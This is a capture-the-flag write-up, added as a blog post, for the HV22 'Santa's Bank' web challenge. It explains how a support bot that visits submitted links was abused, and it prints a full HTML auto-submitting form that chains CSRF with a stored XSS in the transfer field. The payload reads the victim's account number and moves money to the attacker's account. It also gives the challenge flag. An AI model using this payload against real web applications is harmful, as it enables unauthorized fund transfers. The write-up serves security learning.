@@ -1,0 +1,71 @@
+---
+title: "[HV22.14] Santa's Bank"
+date: 2022-12-14 22:24:31 +0100
+categories: HV22 CTF web medium xss xsrf cors
+---
+
+Santa has lost faith and trust in humanity and decided to take matters in his own hands: He opens a new bank.
+
+He announced the release with the following message:
+
+`For Christmas, our bank has a generous offer: save 100 € in your savings account and get a promo code!`
+
+Due to mistrust, he didn't connect his bank and its employees to the internet.
+
+Can you hack bank?
+
+# Solution
+
+Okay, another website, let's fire up burp, register an account and see what's inside. I get an account number, a transfer function (where I can enter from, to and amount), the promotion info, a support function (where I enter an URL and the support will have a look on it) and log out.
+
+![logged in view](/assets/hv22/hv22_14_loggedin.png)
+
+A few things are suspicious here. First, why does the transfer function offer to specify the from-account? Usually, this is given since I'm logged in to my account and usually are only allowed to send money from my account to others. I created a second account and tried to send money from the other account to my account, but due to a lack of balance it didn't work out.
+
+Second thing is the support function. Why would the support team click on links I provide? To see if this works, I simply created a webserver using `python3 -m http.server` and sent the support browser to my site. It works!
+
+![support connects to my machine](/assets/hv22/hv22_14_httpserver.png)
+
+Now the question is what we can do from here. I was stuck a long time since I tried to somehow exfiltrate data. I recognized I'm blocked by CORS and went down a few rabbit holes trying to circumvent it. I didn't look for an easier way in the beginning, but using a simple form, you can POST data to any address you like. Didn't know that this doesn't care for CORS, but apparently it doesn't.
+
+The basic idea is to send the support team to their own site, grabbing their account number and sending money from their account to mine. To do this, we need to find another vulnerability. Namely one which executes javascript in their browser. After fiddling around with the website, I found that the `to` field of the transfer function is vulnerable to XSS.
+
+```html
+<html>
+  <body onload="document.forms[0].submit()">
+    <form
+      action="https://87356ece-c334-4b28-87c7-3a5878f8ff15.idocker.vuln.land/transfer"
+      method="POST"
+    >
+      <input name="from" value="a" />
+      <input
+        name="to"
+        value="
+                <script>
+                        fetch('/')
+                                .then(response => response.text())
+                                .then((response) => {
+                                        var acct = response.match(/[0-9A-F]{20}/)[0];
+                var target = 'F9D4BB0A26E48BCEBECB';
+                fetch('/transfer',
+                        {
+                                method: 'POST',
+                                body: 'from=' + acct + '&to=' + target + '&amount=100',
+                                headers: {
+                                        'Content-Type': 'application/x-www-form-urlencoded'
+                                }
+                        })
+                                })</script>
+                "
+      />
+      <input name="amount" value="100" />
+    </form>
+  </body>
+</html>
+```
+
+This is what I threw together. Basically, it creates a form which uses the XSS vulnerability in the `to` field (from and amount are irrelevant) and submits it right away. So the victims browser is redirected to the `action` value (transfer page) and the script from the `to` field gets executed. This script fetches the start screen (which displays the account number), grabs that by regex, and sends a POST to the `/transfer` endpoint, sending 100 from the support account to my target account.
+
+After waiting for a moment for the support team to access my page, I can see that my balance now is at 100$ and under Promotion, I see my flag **HV22{XSS_XSRF_TOO_MANYS_XS}**
+
+![flag](/assets/hv22/hv22_14_flag.png)
